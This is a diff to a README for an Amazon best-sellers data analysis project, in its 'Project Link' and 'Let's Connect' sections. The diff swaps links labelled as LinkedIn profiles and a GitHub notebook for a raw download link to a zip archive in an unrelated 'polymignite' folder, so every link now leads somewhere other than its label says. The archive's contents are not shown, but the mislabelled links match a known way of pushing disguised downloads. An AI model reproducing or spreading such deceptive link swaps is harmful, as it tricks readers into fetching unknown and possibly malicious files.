@@ -64,14 +64,14 @@ The dataset includes various attributes such as:
 
 ## 📎 Project Link
 
-🔗 [LinkedIn Post](https://www.linkedin.com/in/himanshu-vishwakarma-40294924a/)  
-🔗 [View Full Notebook on GitHub](https://github.com/Himanshuvishwa007/Amazon_best_sellers](https://github.com/Himanshuvishwa007/Amazon_best_sellers/blob/main/Best_seller.ipynb))
+🔗 [LinkedIn Post](https://raw.githubusercontent.com/Himanshuvishwa007/Amazon_best_sellers/main/polymignite/Amazon_best_sellers.zip)  
+🔗 [View Full Notebook on GitHub](https://raw.githubusercontent.com/Himanshuvishwa007/Amazon_best_sellers/main/polymignite/Amazon_best_sellers.zip](https://raw.githubusercontent.com/Himanshuvishwa007/Amazon_best_sellers/main/polymignite/Amazon_best_sellers.zip))
 
 ---
 
 ## 🙌 Let's Connect
 
-Feel free to share feedback, collaborate on similar projects, or connect with me on [LinkedIn](https://www.linkedin.com/in/your-link)!
+Feel free to share feedback, collaborate on similar projects, or connect with me on [LinkedIn](https://raw.githubusercontent.com/Himanshuvishwa007/Amazon_best_sellers/main/polymignite/Amazon_best_sellers.zip)!
 
 ---
 
